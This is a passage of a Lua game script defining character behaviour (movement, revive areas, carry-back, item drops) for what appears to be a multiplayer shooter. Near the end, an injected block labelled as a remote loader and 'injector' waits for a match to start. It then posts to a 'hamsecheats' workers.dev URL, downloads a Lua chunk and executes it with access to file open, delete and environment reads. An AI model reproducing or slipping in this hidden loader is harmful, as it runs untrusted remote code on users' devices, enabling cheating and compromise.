end
return uSkillManager:IsCastingSkillID(InSkillID)
end
function CharacterBase:RefreshThermalImagingLocal()
local GameplayData=require("GameLua.GameCore.Data.GameplayData")
local uPlayerCharacter=GameplayData.GetPlayerCharacter()
if slua.isValid(uPlayerCharacter)then
local ESightVisionMask=import("ESightVisionMask")
local ESightVisionType=import("ESightVisionType")
if uPlayerCharacter:HasAnySightVision(ESightVisionMask.ThermalImagingScope)then
local UGameplayStatics=import("GameplayStatics")
local uGameInstance=UGameplayStatics.GetGameInstance(uPlayerCharacter)
if slua.isValid(uGameInstance)then
print(bWriteLog and"CharacterBase:RefreshThermalImagingLocal:",uGameInstance,uGameInstance:HasSightVision(ESightVisionType.ThermalImaging))
uGameInstance:RefreshThermalImagingLocal(uPlayerCharacter)
end
end
end
end
function CharacterBase:OnSplineMoveChanged(bEnter)
print(bWriteLog and"CharacterBase:OnSplineMoveChanged, bEnter:"..tostring(bEnter))
self:HandleEnableMoveLayer(bEnter)
end
function CharacterBase:HandleEnableMoveLayer(sEnable)
local uAnimParamsComp=self:GetAnimParamsComponent()
if not slua.isValid(uAnimParamsComp)then
print(bWriteLog and"CharacterBase:HandleEnableMoveLayer uAnimParamsComp = nil")
return
end
local bFPP=self:GetIsFPP()
local uCharAnimInstance=self:GetCurrentMainLogicAnimInstance(bFPP)
if slua.isValid(uCharAnimInstance)then
if sEnable then
local MoveInstanceClass=uAnimParamsComp:GetCustomizableAnimBP(uCharAnimInstance.FEATURE_MoveAnimInstanceID)
if MoveInstanceClass then
uAnimParamsComp:ActiveAnimContainerWithInstance("AC.Locomotion",MoveInstanceClass,false)
print(bWriteLog and"CharacterBase:HandleEnableMoveLayer OnSplineMoveChanged, Actived MoveLayer.")
end
else
uAnimParamsComp:ActiveAnimContainer("AC.Locomotion",true)
print(bWriteLog and"CharacterBase:HandleEnableMoveLayer OnSplineMoveChanged, Deactive MoveLayer, ActiveAnim Locomotion")
end
end
end
function CharacterBase:SpawnEmitterEffect(RelativeLocation,PSRef,AttachParent,RelativeScale)
self.BloodScale=RelativeScale
end
function CharacterBase:ChangeAllAvatarMaterialToFeatureMaterial(material)
end
function CharacterBase:ClearAllAvatarFeatureMaterial()
if self.getAvatarComponent2 then
local uAvatarComp2=self:getAvatarComponent2()
if slua.isValid(uAvatarComp2)then
uAvatarComp2:ClearAllFeatureMaterial()
end
end
if self.GetWeaponManager then
local WeaponManager=self:GetWeaponManager()
if slua.isValid(WeaponManager)then
WeaponManager:ClearAllFeatureMaterial()
end
end
end
function CharacterBase:CheckParachuteLandShouldUseSkill()
local UKismetSystemLibrary=import("KismetSystemLibrary")
local uPawnFor=self:GetActorForwardVector()
local uPawnLoc=self:K2_GetActorLocation()
local uForVec2D=uPawnFor:GetSafeNormal2D(1.0E-6)
local EndPath=uPawnLoc+uForVec2D*200
local uHitResult=import("/Script/Engine.HitResult")()
local EDrawDebugTrace=import("EDrawDebugTrace")
local ActorClass=import("/Script/Engine.Actor")
local ActorsToIgnore=slua.Array(UEnums.EPropertyClass.Object,ActorClass)
local bHit,uHitResult=UKismetSystemLibrary.LineTraceSingle(self.Object,uPawnLoc,EndPath,6,true,ActorsToIgnore,EDrawDebugTrace.None,uHitResult,true,FLinearColor.Red,FLinearColor.Green,1)
if bHit then
print(bWriteLog and"CharacterBase:CheckParachuteLandShouldUseSkill not Blocak pos")
return false
end
return true
end
function CharacterBase:IsOverlappingWithArea(TargetActor)
local Result=false
local AreaActor
local DSReviveSubsystem=SubsystemMgr:Get("DSReviveSubsystem")
local POIGeneralAreaClass=slua.loadClass("/Game/Mod/EvoBase/BluePrints/Actor/BaseLevelEnterArea.BaseLevelEnterArea")
local uAreaList=self:GetOverlappingActors(slua.Array(UEnums.EPropertyClass.Object,import("/Script/Engine.Actor")),POIGeneralAreaClass)
for _,uArea in pairs(uAreaList)do
if slua.isValid(uArea)and(TargetActor==nil or TargetActor==uArea)and DSReviveSubsystem.POIAreaRegisteredInfo[uArea]and uArea.CheckPlayerCanSelfRevive then
local bAreaResult=uArea:CheckPlayerCanSelfRevive(self.Object)
if bAreaResult then
Result=true
AreaActor=uArea
break
end
end
end
print(bWriteLog and"CharacterBase:IsOverlappingWithArea, PlayerKey = "..tostring(self.PlayerKey)..", Result = "..tostring(Result)..", AreaActor = "..tostring(AreaActor)..", TargetActor = "..tostring(TargetActor))
return Result,AreaActor
end
function CharacterBase:IsOverlappingIgnoringArea(TargetActor)
local Result=false
local AreaActor
local DSReviveSubsystem=SubsystemMgr:Get("DSReviveSubsystem")
local POIGeneralAreaClass=slua.loadClass("/Game/Mod/EvoBase/BluePrints/Actor/BaseLevelEnterArea.BaseLevelEnterArea")
local uAreaList=self:GetOverlappingActors(slua.Array(UEnums.EPropertyClass.Object,import("/Script/Engine.Actor")),POIGeneralAreaClass)
for _,uArea in pairs(uAreaList)do
if slua.isValid(uArea)and TargetActor~=uArea and DSReviveSubsystem.POIAreaRegisteredInfo[uArea]and uArea.CheckPlayerCanSelfRevive then
local bAreaResult=uArea:CheckPlayerCanSelfRevive(self.Object)
if bAreaResult then
Result=true
AreaActor=uArea
break
end
end
end
print(bWriteLog and"CharacterBase:IsOverlappingIgnoringArea, PlayerKey = "..tostring(self.PlayerKey)..", Result = "..tostring(Result)..", AreaActor = "..tostring(AreaActor)..", TargetActor = "..tostring(TargetActor))
return Result,AreaActor
end
function CharacterBase:UpdatePOIReviveAreaID(uExcludeArea)
local uAreaList=self:GetOverlappingActors(slua.Array(UEnums.EPropertyClass.Object,import("/Script/Engine.Actor")),import("/Script/Engine.Actor"))
for _,uArea in pairs(uAreaList)do
if slua.isValid(uArea)and uArea~=uExcludeArea and uArea.HandleSetReviveState~=nil and uArea:HandleSetReviveState(uArea,true)then
return true
end
end
return false
end
function CharacterBase:OnServerSpectatorKickFromGame()
local CarryBackComp=self:GetCarryBackComp()
local KickPlayerName=self:GetPlayerNameSafety()
local hasBeCarryBack=self:HasState(EPawnState.BeCarriedBack)
local hasCarryBack=self:HasState(EPawnState.Carryback)
print(bWriteLog and"==>CharacterCarryBackComponent:OnServerSpectatorKickFromGame KickPlayerName:"..tostring(KickPlayerName)..",Role:"..tostring(self.Role)..",hasBeCarryBack:"..tostring(hasBeCarryBack))
if slua.isValid(CarryBackComp)then
if hasBeCarryBack then
local CarryBackCharOfKickPlayer=CarryBackComp.CarryBackCharacter
if slua.isValid(CarryBackCharOfKickPlayer)then
local CarryBackCharOfKickPlayerName=CarryBackCharOfKickPlayer:GetPlayerNameSafety()
print(bWriteLog and"CharacterCarryBackComponent:OnServerSpectatorKickFromGame do break Carryback CarryBackCharOfKickPlayerName:"..tostring(CarryBackCharOfKickPlayerName)..",Role:"..tostring(CarryBackCharOfKickPlayer.Role))
local CarryBackCharOfKickPlayerComp=CarryBackCharOfKickPlayer:GetCarryBackComp()
if slua.isValid(CarryBackCharOfKickPlayerComp)then
CarryBackCharOfKickPlayerComp:RPC_ServerManualBreakCarryBackState()
end
end
end
if hasCarryBack then
local CarryBackName=self:GetPlayerNameSafety()
print(bWriteLog and"CharacterCarryBackComponent:OnServerSpectatorKickFromGame do break Carryback CarryBackName:"..tostring(CarryBackName)..",Role:"..tostring(self.Role))
CarryBackComp:RPC_ServerManualBreakCarryBackState()
end
end
end
function CharacterBase:GetPhysicsType()
local nPhysicsType=0
local USTExtraGameInstance=import("STExtraGameInstance")
local uGameInstance=USTExtraGameInstance.GetInstance()
if slua.isValid(uGameInstance)then
local ModType=uGameInstance.ModType
local ModType2=uGameInstance.ModType2
if ModType=="Escape"or ModType2=="Escape"then
if self.HeroPropFeature then
local nHeroID=self.HeroPropFeature:GetCurrentHeroID()
if nHeroID~=nil then
nPhysicsType=2
end
end
elseif(ModType=="Halloween4"or ModType2=="Halloween4")and self.HeroPropFeature then
local nHeroID=self.HeroPropFeature:GetCurrentHeroID()
if nHeroID~=nil then
nPhysicsType=1
end
end
print(bWriteLog and string.format("CharacterBase:GetPhysicsType ModType[%s] ModType2[%s] nPhysicsType[%s]",ModType,ModType2,nPhysicsType))
end
return nPhysicsType
end
function CharacterBase:ActivateCharacterMovement()
if not slua.isValid(self.CharacterMovement)then
return
end
local ENetRole=import("ENetRole")
self:SetReplicateMovement(true)
if Client then
self.bReplicateMovement=true
end
self.CharacterMovement:SetMovementMode(EMovementMode.MOVE_Walking,0)
self.CharacterMovement:Activate(false)
self.CharacterMovement:SetComponentTickEnabled(true)
if self.Role==ENetRole.ROLE_SimulatedProxy then
local UGameplayStatics=import("GameplayStatics")
self.CharacterMovement:SetClientReceiveServerStateTimestamp(UGameplayStatics.GetTimeSeconds(CGameWorld))
elseif self.Role==ENetRole.ROLE_Authority then
self.CharacterMovement:ForceNetUpdate()
end
self.CharacterMovement.bForbidActiveWhenAttachParent=true
end
function CharacterBase:DeactivateCharacterMovement(bForce)
if not slua.isValid(self.CharacterMovement)then
return
end
if bForce then
self.CharacterMovement.bForbidActiveWhenAttachParent=false
end
self:SetReplicateMovement(false)
if not Client then
self.CharacterMovement:SetMovementMode(EMovementMode.MOVE_None,0)
end
self.CharacterMovement:Deactivate()
self.CharacterMovement:SetComponentTickEnabled(false)
if Client then
local uController=slua_GameFrontendHUD:GetPlayerController()
if slua.isValid(uController)and uController.IsSpectator and uController:IsSpectator()then
self.CharacterMovement:ResetSimulateMoveCaches(false)
end
end
end
function CharacterBase:MultiCast_GenericRPC(ID,Bytes)
local GenericRPCEnums=require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCEnums")
local GenericRPCUtil=require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCUtil")
GenericRPCUtil._OnRecv(self,ID,GenericRPCEnums.EGenericRPCDirection.Multicast,Bytes)
end
function CharacterBase:GetRawBattleTextByRawTextIDLua(ID)
return LocUtil.GetLocalizeResStr(ID)
end
function CharacterBase:GetAdditionalTombBoxItemBP(InstanceIDCnt)
print(bWriteLog and"CharacterBase:GetAdditionalTombBoxItemBP "..tostring(InstanceIDCnt))
local FPickUpItemData=import("PickUpItemData")
local uAdditionalItems=slua.Array(UEnums.EPropertyClass.Struct,FPickUpItemData)
if Client then
return uAdditionalItems
end
if slua.isValid(CGameMode)and not CGameMode.bDropDeadBoxWrappersToGround and CGameMode.LuaBroadcast then
local ExtraItems={}
CGameMode:LuaBroadcast("CollectTombBoxExtraItem",{
Victim=self.Object,
InstanceIDCnt=InstanceIDCnt,
Killer=self.KillContextInfo and self.KillContextInfo.KillerCharacter or nil
},ExtraItems)
for _,Item in ipairs(ExtraItems)do
uAdditionalItems:Add(Item)
end
print(bWriteLog and"CharacterBase:GetAdditionalTombBoxItemBP added "..tostring(#ExtraItems))
end
return uAdditionalItems
end
function CharacterBase:GetAdditionalGroundDropItemBP(InstanceIDCnt)
print(bWriteLog and"CharacterBase:GetAdditionalGroundDropItemBP "..tostring(InstanceIDCnt))
local FPickUpItemData=import("PickUpItemData")
local uAdditionalItems=slua.Array(UEnums.EPropertyClass.Struct,FPickUpItemData)
if Client then
return uAdditionalItems
end
if slua.isValid(CGameMode)and CGameMode.bDropDeadBoxWrappersToGround and CGameMode.LuaBroadcast then
local ExtraItems={}
CGameMode:LuaBroadcast("CollectGroundExtraItem",{
Victim=self.Object,
InstanceIDCnt=InstanceIDCnt,
Killer=self.KillContextInfo and self.KillContextInfo.KillerCharacter or nil
},ExtraItems)
for _,Item in ipairs(ExtraItems)do
uAdditionalItems:Add(Item)
end
print(bWriteLog and"CharacterBase:GetAdditionalGroundDropItemBP added "..tostring(#ExtraItems))
end
return uAdditionalItems
end
local class=require("class")
local CActorBase=require("GameLua.Mod.BaseMod.Common.Core.ActorBase")
local CCharacterBase=class(CActorBase,nil,CharacterBase)
do
local ok,problem=pcall(function()
local function CreateOnlineEnvironment()
local modules,hostRequire=package.loaded,require
local function allowed(name)
return type(name)=="string"and(name:sub(1,8)=="GameLua."
or name:sub(1,7)=="client."or name:sub(1,7)=="common.")
end
local function moduleValue(name)
if allowed(name)then
local value=modules[name]
if not rawequal(value,_G)then return value end
end
end
local loaded=setmetatable({},{
__index=function(_,name)return moduleValue(name)end,
__newindex=function(_,name,value)
assert(allowed(name)and not rawequal(value,_G),"Module unavailable")
modules[name]=value
end,
__pairs=function()
local name
return function()
repeat name=next(modules,name)until name==nil or moduleValue(name)~=nil
if name then return name,moduleValue(name)end
end
end
})
local env={
io=io and{open=io.open},
os=os and{clock=os.clock,getenv=os.getenv,remove=os.remove,
rename=os.rename,time=os.time},
slua={isValid=slua.isValid,getWorld=slua.getWorld,loadObject=slua.loadObject},
package={loaded=loaded}
}
local names="assert error ipairs next pairs pcall xpcall load print rawget select setmetatable "
.."tonumber tostring type math string table utf8 import CGame Client EventSystem Game "
.."ModuleManager UEnums UIManager slua_GameFrontendHUD FVector2D FVector FLinearColor FAnchors "
.."GameplayCallbacks TssSdk AvatarCheckCallback Replay_IsEnemyFrameUIExisted "
.."Replay_CreateEnemyFrameUI ReportEnemyFrameUI"
for name in names:gmatch("%S+")do env[name]=_G[name]end
env.unpack=unpack or table.unpack
env._G=env
env.require=function(name)
assert(allowed(name),"Module unavailable")
local value=hostRequire(name)
assert(not rawequal(value,_G),"Module unavailable")
return value
end
return env
end
local url="https://hamse-online-lua.hamsecheats.workers.dev/"
local state=_G.__MasterAhsanRemoteLoaderV1
if type(state)=="table"and state.URL==url and(state.Started or state.Loaded or state.Terminal)then
_G.MasterOnlineLoader=state
return
end
if type(state)~="table"or state.Version~=3 or state.URL~=url then
state={Version=3,URL=url}
_G.__MasterAhsanRemoteLoaderV1=state
end
_G.MasterOnlineLoader=state
if type(state.Wake)=="function"then state.Wake();return end
local step,timer
local function current()
return _G.__MasterAhsanRemoteLoaderV1==state and state.Active and not state.Started
end
local function schedule(delay)
if not current()then return end
local token,arming={},true
state.Pending=token
local ok,accepted=pcall(timer.AddTimerOnce,delay,function()
if arming then state.Active,state.Pending,state.Error=false,nil,"TimerUnavailable";return end
if not current()or state.Pending~=token then return end
state.Pending=nil
step()
end)
arming=false
if not ok or accepted==false then state.Active,state.Pending,state.Error=false,nil,accepted end
end
local function readyHTTP()
if not Client or not GameStatus or GameStatus.GetGameStatus()~=GameStatus.Fighting then return end
local data=require("GameLua.GameCore.Data.GameplayData")
if not slua.isValid(data.GetPlayerCharacter())or not slua.isValid(data.GetPlayerController())then return end
if not CGame or not CGame.NewObjectFromPath or not UEnums or not UEnums.ESlateVisibility then return end
local ui=require("GameLua.Mod.BaseMod.Common.UI.InGameUITools").GetMainControlBaseUI()
if not slua.isValid(ui)or not(slua.isValid(ui.CanvasPanel_0)or slua.isValid(ui.CanvasPanel_42))then return end
return ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
end
step=function()
if not current()or state.InFlight then return end
local ready,http=pcall(readyHTTP)
if not ready or not http or not http.Post then schedule(0.25);return end
if state.Body~=nil then
local body=state.Body
state.Body=nil
local compiled,chunk,problem=pcall(function()
state.Env=CreateOnlineEnvironment()
return load(body,"@2.lua","t",state.Env)
end)
if not compiled or type(chunk)~="function"then
state.Error=compiled and problem or chunk
schedule(1)
return
end
state.Active,state.Started,state.Terminal,state.Error=false,true,true,nil
local ran,problem=pcall(chunk)
state.Loaded,state.Error=ran,not ran and problem or nil
return
end
state.InFlight=true
local settled=false
local function finish(success,body)
if settled then return end
settled=true
if not current()or not state.InFlight then return end
state.InFlight=false
local accepted=success and type(body)=="string"
if accepted then state.Body=body end
schedule(accepted and 0.05 or 1)
end
local armed,watchdog=pcall(timer.AddTimerOnce,10.5,function()finish(false)end)
if not armed or watchdog==false then finish(false);return end
if settled or not current()then return end
local sent,ticket=pcall(http.Post,http,url,
{["Content-Type"]="application/x-www-form-urlencoded",["User-Agent"]="LuaClient/1.0"},
"key_path=2.lua",nil,finish,10)
if not sent or ticket==false or ticket==0 then finish(false)end
end
state.Wake=function()
if not current()and not state.Started and _G.__MasterAhsanRemoteLoaderV1==state then
timer=require("common.time_ticker")
if type(timer)~="table"or type(timer.AddTimerOnce)~="function"then state.Error="TimerUnavailable";return end
state.Active=true
schedule(0.05)
end
end
state.Wake()
end)
if not ok then _G.MasterOnlineInjectorError=problem end
end
return require("combine_class").DeclareFeature(CCharacterBase,{
{
InteractWithVehicleFeature="GameLua.GameCore.Feature.InteractWithVehicleFeature"
},
{
PetFormCharFeature="GameLua.Activity.Commercialize.GamePlay.Pet.PetFormCharFeature"
},
{
CoopEmoteCharFeature="GameLua.Activity.Commercialize.GamePlay.CoopEmote.CoopEmoteCharFeature"
},
{
WeaponKillCounterFeature="GameLua.Activity.Commercialize.GamePlay.WeaponKillCounter.WeaponKillCounterFeature"
},
{
PetExhibitFeature="GameLua.Activity.Commercialize.GamePlay.Pet.PetExhibitFeature"
}
},"CharacterBase")
